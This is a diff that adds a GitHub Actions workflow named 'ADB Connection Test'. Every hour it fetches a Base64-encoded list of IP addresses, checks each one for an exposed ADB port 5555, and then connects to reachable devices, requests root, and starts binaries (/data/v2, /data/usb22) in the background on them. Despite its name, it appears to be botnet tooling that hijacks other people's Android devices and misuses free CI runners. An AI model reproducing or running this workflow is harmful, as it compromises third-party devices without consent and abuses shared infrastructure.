@@ -1,0 +1,86 @@
+name: ADB Connection Test
+
+on:
+  schedule:
+    - cron: '0 * * * *' # 每小时运行一次
+  workflow_dispatch: # 手动触发
+
+jobs:
+  adb-test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout the repository
+      uses: actions/checkout@v2
+
+    - name: Install Telnet and ADB
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y telnet adb curl
+
+    - name: Download the 1.txt file from URL
+      id: download_file
+      run: |
+        curl -o 1.txt https://raw.githubusercontent.com/Janit8r/device_lge_judyln/S/1.txt
+
+    - name: Decode IPs from 1.txt (Base64)
+      id: decode_ips
+      run: |
+        # 将1.txt文件中的每一行逐个解码并存储为一个变量
+        while IFS= read -r line; do
+          DECODED_IP=$(echo "$line" | base64 --decode)
+          echo "$DECODED_IP" >> decoded_ips.txt
+        done < 1.txt
+
+    - name: Collect reachable IPs
+      id: collect_ips
+      run: |
+        # 临时文件存储可用的 IP
+        REACHABLE_IPS="reachable_ips.txt"
+        touch $REACHABLE_IPS
+        
+        # 逐行读取解码后的 IP 并测试端口连通性
+        while IFS= read -r ip; do
+          echo "Testing IP: $ip"
+          
+          # 测试7500端口连通性
+          if timeout 5 bash -c "echo > /dev/tcp/$ip/7500" 2>/dev/null; then
+            echo "$ip:7500 is open, skipping."
+          else
+            echo "$ip:7500 is not open, testing 5555..."
+
+            # 测试5555端口连通性
+            if timeout 5 bash -c "echo > /dev/tcp/$ip/5555" 2>/dev/null; then
+              echo "$ip:5555 is open, adding to reachable IPs."
+              echo "$ip" >> $REACHABLE_IPS
+            else
+              echo "$ip:5555 is not reachable within 5 seconds, skipping."
+            fi
+          fi
+        done < decoded_ips.txt
+        
+        # 输出所有收集到的 IP
+        echo "Collected reachable IPs:"
+        cat $REACHABLE_IPS
+
+    - name: Test ports and run ADB commands
+      run: |
+        # 创建或清空 t.sh 文件
+        > t.sh
+
+        # 逐行读取 reachable_ips.txt 中的 IP 地址
+        while IFS= read -r ip; do
+          # 检查 IP 是否为空
+          if [ -n "$ip" ]; then
+            # 将 IP 替换到模板中，并追加到 t.sh 文件
+            echo "adb connect \"$ip:5555\"" >> t.sh
+            echo "adb root" >> t.sh
+            echo "adb -s \"$ip:5555\" shell 'sh -c \"/data/v2 run > /dev/null 2> /data/error.log &\"'" >> t.sh
+            echo "adb -s \"$ip:5555\" shell 'sh -c \"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\"'" >> t.sh
+            echo "adb disconnect \"$ip:5555\"" >> t.sh
+            echo "" >> t.sh # 添加空行分隔不同 IP 的命令
+          fi
+        done < reachable_ips.txt
+
+        # 执行生成的 t.sh 脚本
+        bash t.sh
